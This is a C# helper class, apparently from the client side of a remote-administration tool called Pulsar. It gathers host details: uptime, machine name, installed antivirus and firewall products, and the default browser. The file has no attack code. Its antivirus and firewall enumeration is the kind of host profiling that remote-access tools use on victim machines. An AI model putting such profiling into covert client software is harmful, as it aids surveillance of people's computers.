using Microsoft.Win32;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Management;

namespace Pulsar.Client.Helper
{
    public static class SystemHelper
    {
        public static string GetUptime()
        {
            try
            {
                // Try registry-based approach first (more reliable than WMI)
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"))
                {
                    if (key != null)
                    {
                        var bootTimeValue = key.GetValue("BootTime");
                        if (bootTimeValue is long bootTime)
                        {
                            // BootTime is stored as FILETIME (100-nanosecond intervals since Jan 1, 1601)
                            var bootDateTime = DateTime.FromFileTime(bootTime);
                            var uptimeSpan = DateTime.Now - bootDateTime;

                            return string.Format("{0}d : {1}h : {2}m : {3}s",
                                uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
                        }
                    }
                }

                // Fallback to WMI if registry fails
                string uptime = string.Empty;
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);

                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
                        break;
                    }
                }

                if (string.IsNullOrEmpty(uptime))
                    throw new Exception("Getting uptime failed");

                return uptime;
            }
            catch (Exception)
            {
                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
            }
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetAntivirus()
        {
            try
            {
                string antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = "root\\SecurityCenter2";
                string query = "SELECT * FROM AntivirusProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        antivirusName += mObject["displayName"].ToString() + "; ";
                    }
                }
                antivirusName = StringHelper.RemoveLastChars(antivirusName);

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = "root\\SecurityCenter2";
                string query = "SELECT * FROM FirewallProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = StringHelper.RemoveLastChars(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetDefaultBrowser()
        {
            try
            {
                const string registryKey = @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice";
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(registryKey))
                {
                    string progId = key?.GetValue("ProgId")?.ToString() ?? "";

                    if (!string.IsNullOrEmpty(progId))
                    {
                        var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                    {
                        { "ChromeHTML", "Google Chrome" },
                        { "MSEdgeHTM", "Microsoft Edge" },
                        { "IE.HTTP", "Internet Explorer" },
                        { "FirefoxURL", "Mozilla Firefox" },
                        { "BraveHTML", "Brave" },
                        { "OperaStable", "Opera" },
                        { "VivaldiHTM", "Vivaldi" }
                    };

                        foreach (var kvp in map)
                        {
                            if (progId.StartsWith(kvp.Key, StringComparison.OrdinalIgnoreCase))
                                return kvp.Value;
                        }

                        // fallback: trim weird suffixes
                        return progId.Split('-')[0].Replace("URL", "").Replace("HTML", "").Trim();
                    }
                }
            }
            catch
            {
                // ignore and fallback
            }

            return "-";
        }
    }
}
